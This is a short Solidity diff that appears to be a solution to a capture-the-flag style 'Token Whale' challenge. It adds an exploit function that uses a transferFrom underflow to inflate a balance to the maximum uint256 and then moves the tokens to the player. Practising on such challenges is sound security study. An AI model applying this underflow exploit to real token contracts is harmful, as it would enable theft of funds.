@@ -70,4 +70,10 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+
+    // Player must approve before calling this function
+    function exploit(address player) public {
+        tokenWhale.transferFrom(player, player, 1); // Forces my balance to go from zero to max value of uint256
+        tokenWhale.transfer(player, tokenWhale.balanceOf(address(this)));
+    }
 }
